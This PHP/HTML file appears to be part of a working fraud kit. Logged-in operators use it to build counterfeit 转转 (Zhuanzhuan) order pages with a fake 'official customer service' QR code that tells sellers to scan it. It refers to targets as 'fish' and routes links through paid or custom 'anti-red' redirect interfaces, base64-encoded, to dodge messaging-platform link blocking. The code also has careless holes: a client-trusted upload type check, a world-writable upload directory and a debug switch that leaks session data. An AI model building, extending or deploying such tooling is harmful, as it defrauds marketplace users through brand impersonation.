<?php
if (!defined('FROM_ROUTER')) {
    http_response_code(403);
    exit('喜乐科技@x60898');
}
session_start();
require_once $_SERVER['DOCUMENT_ROOT'] . '/config/dbconfig.php';
checkLogin();

$currentAgent = $_SESSION['username'];

// 处理图片上传
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['image'])) {
    header('Content-Type: application/json');
    
    $response = ['success' => false, 'message' => '', 'url' => ''];
    
    $file = $_FILES['image'];
    $allowedTypes = ['image/jpeg', 'image/png', 'image/gif', 'image/jpg', 'image/webp'];
    $maxSize = 5 * 1024 * 1024; // 5MB
    
    if (!in_array($file['type'], $allowedTypes)) {
        $response['message'] = '只允许上传JPEG、PNG、GIF、WEBP格式的图片';
    } elseif ($file['size'] > $maxSize) {
        $response['message'] = '图片大小不能超过5MB';
    } else {
        $uploadDir = $_SERVER['DOCUMENT_ROOT'] . '/uploads/share/';
        if (!is_dir($uploadDir)) {
            mkdir($uploadDir, 0777, true);
        }
        
        $fileName = uniqid() . '_' . preg_replace('/[^a-zA-Z0-9\.]/', '_', $file['name']);
        $filePath = $uploadDir . $fileName;
        
        if (move_uploaded_file($file['tmp_name'], $filePath)) {
            $response['success'] = true;
            $response['url'] = '/uploads/share/' . $fileName;
        } else {
            $response['message'] = '文件上传失败';
        }
    }
    
    echo json_encode($response);
    exit;
}

function generateCustomerName($length = 6) {
    $characters = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}

// 生成XEDATA令牌
function generateXEDataToken() {
    return md5(uniqid(mt_rand(), true));
}

// 创建会话记录到 XE-SKDJWKSNCDATA 表
function createChatSession($sessionId, $customerName, $agentAccount, $platform = '转转') {
    $db = getDB();
    if (!$db) return false;
    
    $xedataToken = generateXEDataToken();
    $expiresAt = date('Y-m-d H:i:s', strtotime('+7 days'));
    
    $stmt = $db->prepare("INSERT INTO `XE-SKDJWKSNCDATA` 
                         (session_id, xedata_token, customer_name, agent_account, expires_at, platform) 
                         VALUES (?, ?, ?, ?, ?, ?)");
    $stmt->bind_param("ssssss", $sessionId, $xedataToken, $customerName, $agentAccount, $expiresAt, $platform);
    
    if ($stmt->execute()) {
        return $xedataToken;
    }
    return false;
}

$customerName = generateCustomerName();
$sessionId = 'a' . $customerName . 'z-p' . $currentAgent . 's';
// 生成XEDATA令牌并保存到数据库
$xedataToken = createChatSession($sessionId, $customerName, $currentAgent, '转转');

$currentDomain = $_SERVER['HTTP_HOST'];
$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http";
$baseUrl = $protocol . "://" . $currentDomain;
$originalServiceUrl = $baseUrl . '/' . "ChatZhuan" . '?id=' . $sessionId;

// 添加XEDATA参数
if ($xedataToken) {
    $originalServiceUrl .= '&XEDATA=' . $xedataToken;
}

// 获取防红配置（修复版，调整优先级）
function getAntiRedConfig($username) {
     $db = getDB();
    if (!$db) return null;
    
    // 1. 首先检查防红开关是否开启
    $stmt = $db->prepare("SELECT apply_status FROM user_anti_red_config WHERE username = ?");
    $stmt->bind_param("s", $username);
    $stmt->execute();
    $result = $stmt->get_result();
    $config = $result->fetch_assoc();
    
    if (!$config) {
        // 如果没有配置记录，默认防红开关开启
        $apply_status = 'on';
    } else {
        $apply_status = $config['apply_status'];
    }
    
    // 如果防红开关关闭，直接返回null
    if ($apply_status === 'off') {
        return null;
    }
    
    // 2. 防红开关开启的情况下，检查session中是否有应用的接口（付费或免费）
    if (isset($_SESSION['applied_api_url']) && !empty($_SESSION['applied_api_url'])) {
        $type = $_SESSION['applied_domain_type'] ?? 'paid';
        $applied_domain = $_SESSION['applied_domain'] ?? '付费接口';
        
        return [
            'api_url' => $_SESSION['applied_api_url'],
            'apply_status' => 'on',
            'applied_domain' => $applied_domain,
            'encoding_mode' => 'base64',
            'type' => $type
        ];
    }
    
    // 3. 检查session中是否有自定义接口
    if (isset($_SESSION['custom_interface_url']) && !empty($_SESSION['custom_interface_url'])) {
        return [
            'api_url' => $_SESSION['custom_interface_url'],
            'apply_status' => 'on',
            'applied_domain' => isset($_SESSION['custom_interface_remark']) ? $_SESSION['custom_interface_remark'] : '自定义接口',
            'encoding_mode' => isset($_SESSION['custom_encoding_mode']) ? $_SESSION['custom_encoding_mode'] : 'base64',
            'type' => 'custom'
        ];
    }
    
    // 4. 从数据库查询用户配置
    if ($config['apply_status'] === 'on' && !empty($config['applied_domain'])) {
        $applied_domain = $config['applied_domain'];
        
        // 先尝试从免费接口表中查找
        $freeStmt = $db->prepare("SELECT api_url FROM freeantired WHERE name = ? AND status = 'active'");
        $freeStmt->bind_param("s", $applied_domain);
        $freeStmt->execute();
        $freeResult = $freeStmt->get_result();
        
        if ($freeResult->num_rows > 0) {
            // 是免费接口
            $freeData = $freeResult->fetch_assoc();
            $config['api_url'] = $freeData['api_url'];
            $config['type'] = 'free';
            $config['encoding_mode'] = 'base64';
            return $config;
        }
        
        // 再尝试从付费接口表中查找
        $paidStmt = $db->prepare("SELECT api_url FROM anti_red_links WHERE domain_name = ? AND sold_to = ?");
        $paidStmt->bind_param("ss", $applied_domain, $username);
        $paidStmt->execute();
        $paidResult = $paidStmt->get_result();
        
        if ($paidResult->num_rows > 0) {
            // 是付费接口
            $paidData = $paidResult->fetch_assoc();
            $config['api_url'] = $paidData['api_url'];
            $config['type'] = 'paid';
            $config['encoding_mode'] = 'base64';
            return $config;
        }
        
        // 如果都不是，检查是否是自定义接口（在 userantired 表中）
        $customStmt = $db->prepare("SELECT ua.api_url, ua.encoding 
                                    FROM userantired ua 
                                    JOIN users u ON ua.user_id = u.id 
                                    WHERE u.username = ? AND ua.remark = ? AND ua.status = 'active'");
        $customStmt->bind_param("ss", $username, $applied_domain);
        $customStmt->execute();
        $customResult = $customStmt->get_result();
        
        if ($customResult->num_rows > 0) {
            // 是自定义接口
            $customData = $customResult->fetch_assoc();
            $config['api_url'] = $customData['api_url'];
            $config['encoding_mode'] = $customData['encoding'] ?? 'base64';
            $config['type'] = 'custom';
            return $config;
        }
    }
    
    return null;
}

$antiRedConfig = getAntiRedConfig($currentAgent);
$serviceUrl = $originalServiceUrl;

// 读取源站URL配置
$db = getDB();
$webconfigResult = $db->query("SELECT site_url, site_url_enabled FROM webconfig ORDER BY id DESC LIMIT 1");
$siteUrlConfig = null;
if ($webconfigResult && $webconfigResult->num_rows > 0) {
    $siteUrlConfig = $webconfigResult->fetch_assoc();
}

if ($antiRedConfig && $antiRedConfig['apply_status'] === 'on' && !empty($antiRedConfig['api_url'])) {
    $encoding_mode = $antiRedConfig['encoding_mode'] ?? 'base64';
    
    // 根据编码模式处理URL
    switch ($encoding_mode) {
        case 'base64':
            $encodedUrl = base64_encode($originalServiceUrl);
            break;
        case 'urlencode':
        case 'url':
            $encodedUrl = urlencode($originalServiceUrl);
            break;
        case 'none':
        default:
            $encodedUrl = $originalServiceUrl;
            break;
    }
    
    $serviceUrl = $antiRedConfig['api_url'] . $encodedUrl;
    
    // 调试信息
    error_log("防红接口应用信息: " . json_encode([
        'type' => $antiRedConfig['type'] ?? 'unknown',
        'applied_domain' => $antiRedConfig['applied_domain'] ?? 'unknown',
        'api_url' => $antiRedConfig['api_url'],
        'encoding_mode' => $encoding_mode,
        'original_url' => $originalServiceUrl,
        'encoded_url' => $encodedUrl,
        'final_url' => $serviceUrl
    ]));
} elseif ($siteUrlConfig && !empty($siteUrlConfig['site_url_enabled']) && !empty($siteUrlConfig['site_url'])) {
    $serviceUrl = $siteUrlConfig['site_url'] . base64_encode($originalServiceUrl);
}

// 输出调试信息（开发环境中使用）
if (isset($_GET['debug'])) {
    echo "<!-- 防红配置信息: " . json_encode($antiRedConfig) . " -->\n";
    echo "<!-- 原始URL: $originalServiceUrl -->\n";
    echo "<!-- 最终URL: $serviceUrl -->\n";
    echo "<!-- Session状态: " . json_encode([
        'custom_interface_url' => $_SESSION['custom_interface_url'] ?? '未设置',
        'custom_encoding_mode' => $_SESSION['custom_encoding_mode'] ?? '未设置',
        'custom_interface_remark' => $_SESSION['custom_interface_remark'] ?? '未设置',
        'applied_api_url' => $_SESSION['applied_api_url'] ?? '未设置',
        'applied_domain' => $_SESSION['applied_domain'] ?? '未设置',
        'applied_domain_type' => $_SESSION['applied_domain_type'] ?? '未设置',
        'redirect_to_browser' => $_SESSION['redirect_to_browser'] ?? '未设置'
    ]) . " -->\n";
}
?>

<!DOCTYPE html>
<html lang="zh-CN">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>分享页</title>
	
	<link rel="stylesheet" href="/assets/bootstrap-icons.css">
    <link rel="stylesheet" href="/assets/SharePhoto/main.css">
    <link rel="stylesheet" href="/assets/SharePhoto/zhuanzhuan.css">
    <style>
        .zz-preview {
    max-height: calc(100% + 1px);
    min-height: calc(100% + 1px);
    max-width: 100%;
    min-width: 100%;
    position: relative;
    overflow: hidden;
}
    </style>
</head>
<body> 

<div id="app" data-v-app="">
	<div class="app-container">
		<div class="scroll-container">
			<div class="form-container">
				<div class="form-row">
                    <label>防红</label>
                    <a class="form-link anti-red-link" id="anti-red-status">
                            <?php 
                            if ($antiRedConfig && $antiRedConfig['apply_status'] === 'on') {
                                echo '已配置 (' . $antiRedConfig['applied_domain'] . ')';
                            } else {
                                echo '未配置';
                            }
                            ?> </a>
                         <!-- 移除刷新按钮 -->
                    <div class="copy-link-btn" id="copy-link-btn">
                        <svg viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" width="18" height="18">
                            <path
                                d="M761.088 715.3152a38.7072 38.7072 0 0 1 0-77.4144 37.4272 37.4272 0 0 0 37.4272-37.4272V265.0112a37.4272 37.4272 0 0 0-37.4272-37.4272H425.6256a37.4272 37.4272 0 0 0-37.4272 37.4272 38.7072 38.7072 0 1 1-77.4144 0 115.0976 115.0976 0 0 1 114.8416-114.8416h335.4624a115.0976 115.0976 0 0 1 114.8416 114.8416v335.4624a115.0976 115.0976 0 0 1-114.8416 114.8416z"
                                p-id="5993" fill="#515151"></path>
                            <path
                                d="M589.4656 883.0976H268.1856a121.1392 121.1392 0 0 1-121.2928-121.2928v-322.56a121.1392 121.1392 0 0 1 121.2928-121.344h321.28a121.1392 121.1392 0 0 1 121.2928 121.2928v322.56c1.28 67.1232-54.1696 121.344-121.2928 121.344zM268.1856 395.3152a43.52 43.52 0 0 0-43.8784 43.8784v322.56a43.52 43.52 0 0 0 43.8784 43.8784h321.28a43.52 43.52 0 0 0 43.8784-43.8784v-322.56a43.52 43.52 0 0 0-43.8784-43.8784z"
                                p-id="5994" fill="#515151"></path>
                        </svg>
                        <div>复制链接</div>
                    </div>
                </div>
				<div class="form-row">
					<label>模板</label>
					<select id="template-select">
						<option value="1">游戏鱼</option>
						<option value="2">实物鱼</option>
					</select>
				</div>
				<div class="form-row">
					<label>标题</label>
					<input type="text" id="title-input">
				</div>
				<div class="form-row">
					<label>价格</label>
					<div class="price-input-container">
						<span class="currency-symbol">¥</span>
						<input type="text" id="price-input" class="price-input-with-symbol">
					</div>
				</div>
				<!-- 新增：客服名称 -->
				<div class="form-row">
					<label>客服名称</label>
					<input type="text" id="customer-service-name" value="喜乐">
				</div>
				<!-- 新增：扫码方式 -->
				<div class="form-row">
					<label>扫码方式</label>
					<select id="scan-method">
						<option value="微信">微信</option>
						<option value="支付宝">支付宝</option>
						<option value="浏览器">浏览器</option>
					</select>
				</div>
				<div class="form-row">
					<label>卖家昵称</label>
					<input type="text" id="seller-name-input">
				</div>
				<div class="form-row" style="padding: 16px 16px 16px;">
					<label>封面图</label>
					<label for="upload-cover" class="form-link" id="upload-label">上传图片</label>
					<input type="file" accept="image/*" id="upload-cover" style="display: none;">
				</div>
				
				<!-- 开启订单开关 -->
				<div class="form-row" id="order-switch-row" style="padding: 16px 16px 16px;">
					<label>是否生成订单</label>
					<div class="switch-container">
						<label class="toggle-switch disabled" id="switch-container">
							<input type="checkbox" id="order-switch" disabled>
							<span class="switch-slider"></span>
						</label>
					</div>
				</div>
			</div>
	
          <div class="zz-preview">

            <div class="preview-container">
                <!-- 状态进度条卡片 -->
                <div class="preview-card">
                    <div class="preview-status-header" id="preview-status-header">已下单，等待卖家联系客服</div>
                    <div class="preview-status-progress-container">
                        <div class="preview-status-progress-wrapper">
                            <!-- 进度条轨道 -->
                            <div class="preview-status-progress-track"></div>
                            
                            <!-- 进度条填充 -->
                            <div class="preview-status-progress-fill"></div>
                            
                            <!-- 步骤点 -->
                            <div class="preview-status-steps">
                                <div class="preview-status-step">
                                    <div class="preview-status-step-circle active"></div>
                                    <div class="preview-status-step-text" id="step1">已下单</div>
                                </div>
                                <div class="preview-status-step">
                                    <div class="preview-status-step-circle"></div>
                                    <div class="preview-status-step-text" id="step2">联系客服</div>
                                </div>
                                <div class="preview-status-step">
                                    <div class="preview-status-step-circle"></div>
                                    <div class="preview-status-step-text" id="step3">确认收货</div>
                                </div>
                                <div class="preview-status-step">
                                    <div class="preview-status-step-circle"></div>
                                    <div class="preview-status-step-text" id="step4">待评价</div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                
                <!-- 联系客服卡片 -->
                <div class="preview-card">
                    <div class="preview-contact-section">
                        <div class="preview-contact-info">
                            <h2 class="preview-contact-title">联系客服</h2>
                            <p class="preview-contact-detail">客服：<span class="preview-contact-name" id="customer-service-name-preview">转转客服-喜乐</span></p>
                            <p class="preview-contact-detail">请提醒卖家<span class="preview-contact-method" id="scan-method-preview">微信</span>扫码处理</p>
                            <p class="preview-contact-tip">请提醒卖家扫码配合官方客服进行发货，发货完成后买家确认收货即可完成交易</p>
                        </div>
                        <div class="preview-qr-code-container">
                            <div class="preview-qr-code-wrapper">
                                <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='220' height='220'/%3E" alt="二维码" class="preview-qr-code-img" id="preview-qrcode-img">
                                <div class="preview-qr-logo">
                                    <img src="/assets/img/zzqr.png" alt="转转客服">
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                
                <!-- 商品信息卡片 -->
                <div class="preview-card">
                    <div class="preview-product-info">
                        <div style="display: flex;">
                            <div class="preview-product-image-container">
                                <img src="/assets/img/chunse.png" alt="商品图片" id="preview-product-image" style="width: 100%; height: 100%; object-fit: cover;">
                            </div>
                            <div class="preview-product-details">
                                <div class="preview-product-title" id="preview-product-title">标题</div>
                            </div>
                        </div>
                        <div class="preview-product-price-section">
                            <div class="preview-product-price" id="preview-price">¥1,288.00</div>
                            <div class="preview-product-status" id="preview-status">担保交易中</div>
                        </div>
                    </div>
                    <div class="preview-price-details">
                        <div class="preview-price-row">
                            <span>商品总价</span>
                            <span class="preview-price-value" id="preview-total-price">¥1,288.00</span>
                        </div>
                        <div class="preview-price-row">
                            <span>订单编号</span>
                            <span class="preview-price-value">20260513292429833</span>
                        </div>
                        <div class="preview-price-row">
                            <span>卖家昵称</span>
                            <span class="preview-price-value" id="seller-name-preview">昵称</span>
                        </div>
                    </div>
                </div>
                
                <!-- 底部横幅 -->
                <div class="preview-card preview-bottom-banner">
                    <img src="/assets/img/zzhengfu.png" alt="盼之代售服务" class="preview-banner-img">
                </div>
            </div>
          </div>

			<!-- Toast消息弹窗 -->
			<div id="message-toast" class="message-toast"></div>
			<script src="/assets/qrcode.min.js"></script>
			<script src="/assets/qrcode-helper.js"></script>
			<script>
				// 生成二维码 - 使用PHP动态生成的链接
				var qrCodeUrl = "<?php echo $serviceUrl; ?>";
				var baseUrl = "<?php echo $baseUrl; ?>";
				var imageLink = "";
				var isOrderEnabled = false;
				var orderParams = {
					shop: "",
					title: "",
					rmb: "",
					img: ""
				};
				
				// 显示消息的函数
				function showMessage(message, isWarning = true) {
					var type = isWarning ? 'error' : 'success';
					showToast(message, type);
				}

				function showToast(message, type) {
					var container = document.getElementById('notification-container');
					if (!container) {
						container = document.createElement('div');
						container.id = 'notification-container';
						container.className = 'notification-container';
						document.body.appendChild(container);
					}

					var toast = document.createElement('div');
					toast.className = 'new-user-toast notification-enter-active';
					if (type) {
						toast.classList.add(type);
					}

					var icon = document.createElement('div');
					icon.className = 'toast-icon';
					icon.textContent = type === 'error' ? '!' : '✓';
					toast.appendChild(icon);

					var text = document.createElement('div');
					text.className = 'toast-text';
					text.textContent = message;
					toast.appendChild(text);

					var closeBtn = document.createElement('button');
					closeBtn.className = 'toast-close';
					closeBtn.innerHTML = '&times;';
					closeBtn.addEventListener('click', function() {
						removeToast(toast);
					});
					toast.appendChild(closeBtn);

					container.appendChild(toast);

					setTimeout(function() {
						toast.classList.add('notification-leave-active');
						setTimeout(function() {
							removeToast(toast);
						}, 300);
					}, 4000);

					function removeToast(toast) {
						if (toast.parentNode) {
							toast.parentNode.removeChild(toast);
						}
					}
				}
				
				// 更新模板显示函数
				function updateTemplateDisplay(templateValue) {
					var statusHeader = document.getElementById('preview-status-header');
					var step2Text = document.getElementById('step2');
					var step3Text = document.getElementById('step3');
					
					switch(templateValue) {
						case '1': // 游戏鱼
							statusHeader.textContent = '已下单，等待卖家联系客服';
							step2Text.textContent = '联系客服';
							step3Text.textContent = '确认收货';
							document.getElementById('step4').textContent = '待评价';
							document.getElementById('preview-status').textContent = '担保交易中';
							break;
						case '2': // 实物鱼
							statusHeader.textContent = '已下单，等待卖家发货';
							step2Text.textContent = '已发货';
							step3Text.textContent = '确认收货';
							document.getElementById('step4').textContent = '待评价';
							document.getElementById('preview-status').textContent = '担保交易中';
							break;
					}
				}
				
				// 更新二维码函数
function updateQRCode(qrText) {
    var qrCodeContainer = document.getElementById("preview-qrcode-img");
    if (!qrCodeContainer) {
        return;
    }
    
    // 清空现有内容
    qrCodeContainer.innerHTML = '';
    
    // 检查内容长度 - QR码容量限制（使用H级容错时约1056字符）
    // 使用L级容错可增加容量到约2953字符
    var maxLength = 2500; // 保守估计，确保安全
    if (qrText.length > maxLength) {
        console.warn('二维码内容过长，已截断:', qrText.length, '->', maxLength);
        qrText = qrText.substring(0, maxLength);
    }
    
    // 创建一个容器div来生成二维码
    var qrContainer = document.createElement('div');
    qrContainer.style.display = 'none'; // 隐藏容器
    
    try {
        // 生成二维码 - 使用自适应容错级别
        new QRCode(qrContainer, {
            text: qrText,
            width: getQRSize(qrText, 220),
            height: getQRSize(qrText, 220),
            colorDark: "#000000",
            colorLight: "#ffffff",
            correctLevel: getQRCorrectLevel(qrText)
        });

        // 获取生成的canvas
        var canvas = qrContainer.querySelector('canvas');
        if (canvas) {
            // 将canvas转换为DataURL
            var qrDataURL = canvas.toDataURL();
            qrCodeContainer.src = qrDataURL;
        }
    } catch (e) {
        console.error('QR码生成失败，尝试降级:', e);
        try {
            qrContainer.innerHTML = '';
            new QRCode(qrContainer, {
                text: qrText,
                width: 140,
                height: 140,
                colorDark: "#000000",
                colorLight: "#ffffff",
                correctLevel: QRCode.CorrectLevel.L
            });
            var canvas = qrContainer.querySelector('canvas');
            if (canvas) {
                var qrDataURL = canvas.toDataURL();
                qrCodeContainer.src = qrDataURL;
            }
        } catch(e2) {
            console.error('QR码降级也失败:', e2);
            qrCodeContainer.style.display = 'none';
            var errorDiv = document.createElement('div');
            errorDiv.style.textAlign = 'center';
            errorDiv.style.color = '#ff4d4f';
            errorDiv.style.fontSize = '14px';
            errorDiv.style.padding = '20px';
            errorDiv.innerHTML = '二维码生成失败<br/>链接内容过长';
            qrCodeContainer.parentNode.appendChild(errorDiv);
        }
    }
}
				
				// 检查必填项是否都填写了
				function checkRequiredFields() {
					var sellerName = document.getElementById('seller-name-input') ? document.getElementById('seller-name-input').value.trim() : '';
					var title = document.getElementById('title-input').value.trim();
					var price = document.getElementById('price-input').value.trim();
					var hasImage = imageLink !== '';
					
					return sellerName !== '' && title !== '' && price !== '' && hasImage;
				}
				
				// 检查缺少的必填项
				function getMissingFields() {
					var missingFields = [];
					var sellerName = document.getElementById('seller-name-input') ? document.getElementById('seller-name-input').value.trim() : '';
					var title = document.getElementById('title-input').value.trim();
					var price = document.getElementById('price-input').value.trim();
					var hasImage = imageLink !== '';
					
					if (!sellerName) missingFields.push('卖家昵称');
					if (!title) missingFields.push('标题');
					if (!price) missingFields.push('价格');
					if (!hasImage) missingFields.push('封面图');
					
					return missingFields;
				}
				
				// 更新开关状态
				function updateSwitchState() {
					var allFieldsFilled = checkRequiredFields();
					var orderSwitch = document.getElementById('order-switch');
					var switchContainer = document.getElementById('switch-container');
					
					if (allFieldsFilled) {
						// 所有必填项都已填写，启用开关
						orderSwitch.disabled = false;
						switchContainer.classList.remove('disabled');
					} else {
						// 有必填项未填写，禁用开关并关闭
						orderSwitch.disabled = true;
						orderSwitch.checked = false;
						switchContainer.classList.add('disabled');
						
						// 如果开关之前是开启的，现在关闭了，需要更新二维码
						if (isOrderEnabled) {
							isOrderEnabled = false;
							updateQRCodeWithOrder();
						}
					}
				}
				
				// 更新订单参数并生成链接
function updateQRCodeWithOrder() {
    var qrText = qrCodeUrl; // 基础链接
    
    // 获取客服名称
    var customerServiceNameInput = document.getElementById('customer-service-name');
    var customerServiceName = customerServiceNameInput ? customerServiceNameInput.value.trim() : '喜乐';
    
    // 构建参数数组
    var params = [];
    
    // 开启订单时添加订单参数
    if (isOrderEnabled && checkRequiredFields()) {
        var titleInput = document.getElementById('title-input');
        var priceInput = document.getElementById('price-input');
        var sellerNameInput = document.getElementById('seller-name-input');
        
        orderParams.title = titleInput ? titleInput.value || '' : '';
        orderParams.rmb = priceInput ? priceInput.value || '' : '';
        orderParams.shop = sellerNameInput ? sellerNameInput.value || '' : '';
        orderParams.img = imageLink || '';
        
        if (orderParams.shop) params.push('shop=' + encodeURIComponent(orderParams.shop));
        if (orderParams.title) params.push('title=' + encodeURIComponent(orderParams.title));
        if (orderParams.rmb) params.push('rmb=' + encodeURIComponent(orderParams.rmb));
        if (orderParams.img) params.push('img=' + encodeURIComponent(orderParams.img));
    }
    
    // 添加客服名称参数
    if (customerServiceName && customerServiceName !== '喜乐') {
        params.push('zzkefu=' + encodeURIComponent(customerServiceName));
    }
    
    // 如果有参数，拼接到链接
    if (params.length > 0) {
        var separator = qrText.includes('?') ? '&' : '?';
        qrText = qrText + separator + params.join('&');
    }
    
    // 更新二维码
    updateQRCode(qrText);
    return qrText;
}
				
				document.addEventListener('DOMContentLoaded', function() {
					// 获取DOM元素
					var titleInput = document.getElementById('title-input');
					var priceInput = document.getElementById('price-input');
					var templateSelect = document.getElementById('template-select');
					var uploadCover = document.getElementById('upload-cover');
					var uploadLabel = document.getElementById('upload-label');
					var sellerNameInput = document.getElementById('seller-name-input');
					var customerServiceNameInput = document.getElementById('customer-service-name');
					var scanMethodSelect = document.getElementById('scan-method');
					
					// 订单开关相关元素
					var orderSwitch = document.getElementById('order-switch');
					var switchContainer = document.getElementById('switch-container');
					
					// 预览区域元素
					var previewProductTitle = document.getElementById('preview-product-title');
					var previewPrice = document.getElementById('preview-price');
					var previewTotalPrice = document.getElementById('preview-total-price');
					var previewProductImage = document.getElementById('preview-product-image');
					var sellerNamePreview = document.getElementById('seller-name-preview');
					var customerServiceNamePreview = document.getElementById('customer-service-name-preview');
					var scanMethodPreview = document.getElementById('scan-method-preview');
					
					// 设置默认时间
					function setDefaultDateTime() {
						// 预览区域不需要时间显示，已移除相关代码
					}
					
					// 初始化默认时间
					setDefaultDateTime();
					
					// 价格输入处理
					if (priceInput) {
						priceInput.addEventListener('input', function() {
							var value = this.value.replace(/[^\d.]/g, '');
							
							// 处理多个小数点的情况
							var decimalCount = (value.match(/\./g) || []).length;
							if (decimalCount > 1) {
								var parts = value.split('.');
								value = parts[0] + '.' + parts.slice(1).join('');
							}
							
							// 限制小数点后最多两位
							if (value.includes('.')) {
								var parts = value.split('.');
								if (parts[1].length > 2) {
									value = parts[0] + '.' + parts[1].substring(0, 2);
								}
							}
							
							this.value = value;
							
							// 更新预览区域
							if (value) {
								var formattedPrice = '¥' + parseFloat(value).toLocaleString('zh-CN', {minimumFractionDigits: 2, maximumFractionDigits: 2});
								previewPrice.textContent = formattedPrice;
								previewTotalPrice.textContent = formattedPrice;
								orderParams.rmb = value;
							} else {
								previewPrice.textContent = '¥';
								previewTotalPrice.textContent = '¥';
								orderParams.rmb = '';
							}
							
							// 更新开关状态
							updateSwitchState();
							updateQRCodeWithOrder();
						});
					}
					
					// 标题输入监听
					if (titleInput) {
						titleInput.addEventListener('input', function() {
							previewProductTitle.textContent = this.value;
							orderParams.title = this.value;
							
							// 更新开关状态
							updateSwitchState();
							updateQRCodeWithOrder();
						});
					}
					
					// 卖家昵称输入监听
					if (sellerNameInput) {
						sellerNameInput.addEventListener('input', function() {
							sellerNamePreview.textContent = this.value || '昵称';
							orderParams.shop = this.value;
							
							// 更新开关状态
							updateSwitchState();
							updateQRCodeWithOrder();
						});
					}
					
					// 客服名称输入监听
if (customerServiceNameInput) {
    customerServiceNameInput.addEventListener('input', function() {
        customerServiceNamePreview.textContent = '转转客服-' + (this.value || '喜乐');
        
        // 更新二维码（添加客服名称参数）
        updateQRCodeWithOrder();
    });
}
					
					// 扫码方式选择监听
if (scanMethodSelect) {
    scanMethodSelect.addEventListener('change', function() {
        scanMethodPreview.textContent = this.value;
        // 更新二维码
        updateQRCodeWithOrder();
    });
}
					
					// 模板选择监听
if (templateSelect) {
    templateSelect.addEventListener('change', function() {
        updateTemplateDisplay(this.value);
        // 更新二维码
        updateQRCodeWithOrder();
    });
}
					
					// 图片上传监听
					if (uploadCover) {
						uploadCover.addEventListener('change', function(e) {
							var file = e.target.files[0];
							if (file) {
								// 显示上传中状态
								if (uploadLabel) {
									uploadLabel.textContent = '上传中...';
								}
								
								// 创建FormData对象
								var formData = new FormData();
								formData.append('image', file);
								
								// 发送AJAX请求上传图片
								var xhr = new XMLHttpRequest();
								xhr.open('POST', window.location.href, true);
								
								xhr.onload = function() {
									if (xhr.status === 200) {
										try {
											var response = JSON.parse(xhr.responseText);
											if (response.success) {
												imageLink = response.url;
												orderParams.img = imageLink;
												
												// 更新预览图片
												if (previewProductImage) {
													previewProductImage.src = response.url;
												}
												
												if (uploadLabel) {
													uploadLabel.textContent = '已上传';
												}

												// 更新开关状态
												updateSwitchState();
												
												// 更新二维码
												updateQRCodeWithOrder();
												
												// 显示绿色成功消息
												showMessage('图片上传成功', false);
											} else {
												if (uploadLabel) {
													uploadLabel.textContent = '上传图片';
												}
												// 显示红色失败消息
												showMessage('上传失败: ' + response.message, true);
											}
										} catch (e) {
											if (uploadLabel) {
												uploadLabel.textContent = '上传图片';
											}
											console.error('解析响应失败:', e);
											// 显示红色失败消息
											showMessage('上传失败', true);
										}
									} else {
										if (uploadLabel) {
											uploadLabel.textContent = '上传图片';
										}
										// 显示红色失败消息
										showMessage('上传失败，服务器错误', true);
									}
								};
								
								xhr.onerror = function() {
									if (uploadLabel) {
										uploadLabel.textContent = '上传图片';
									}
									// 显示红色失败消息
									showMessage('上传失败，网络错误', true);
								};
								
								xhr.send(formData);
							}
						});
					}
					
					// 订单开关监听
					if (orderSwitch && switchContainer) {
						// 为整个开关容器添加点击事件
						switchContainer.addEventListener('click', function(e) {
							// 如果开关是禁用的，显示红色警告
							if (orderSwitch.disabled) {
								e.preventDefault();
								e.stopPropagation();
								
								var missingFields = getMissingFields();
								if (missingFields.length > 0) {
									// 显示红色警告消息
									showMessage('请先填写' + missingFields.join('、'), true);
								}
								return false;
							}
						});
						
						// 开关状态变化监听
						orderSwitch.addEventListener('change', function() {
							if (this.disabled) {
								return;
							}
							
							isOrderEnabled = this.checked;
							updateQRCodeWithOrder();
							
							// 显示开关状态消息
							if (isOrderEnabled) {
								// 开启时显示绿色成功消息
								showMessage('订单生成功能已开启', false);
							} else {
								// 关闭时显示红色警告消息
								showMessage('订单生成功能已关闭', true);
							}
						});
					}
					
					// 更新开关状态
					updateSwitchState();
					
					// 初始化显示
					updateTemplateDisplay(templateSelect ? templateSelect.value : '1');
					
					// 初始生成二维码
					updateQRCodeWithOrder();
					
					// 复制链接按钮处理
					var copyLinkBtn = document.getElementById('copy-link-btn');
					if (copyLinkBtn) {
						// 修改复制链接功能，复制带参数的链接
						copyLinkBtn.addEventListener('click', function(e) {
							e.preventDefault();
							e.stopPropagation();
							
							var linkToCopy = updateQRCodeWithOrder();
							
							// 复制到剪贴板
							if (navigator.clipboard && window.isSecureContext) {
								navigator.clipboard.writeText(linkToCopy).then(function() {
									// 显示绿色成功消息
									showMessage('链接已复制到剪贴板', false);
								}).catch(function(err) {
									console.error('复制失败:', err);
									fallbackCopyText(linkToCopy);
								});
							} else {
								fallbackCopyText(linkToCopy);
							}
						});
						
						function fallbackCopyText(text) {
							var textArea = document.createElement("textarea");
							textArea.value = text;
							document.body.appendChild(textArea);
							textArea.focus();
							textArea.select();
							try {
								var successful = document.execCommand('copy');
								var msg = successful ? '链接已复制到剪贴板' : '复制失败';
								showMessage(msg, !successful);
							} catch (err) {
								console.error('复制失败:', err);
								showMessage('复制失败', true);
							}
							document.body.removeChild(textArea);
						}
					}
				});
			</script>
		</div>
	</div>
</div>
</body>
</html>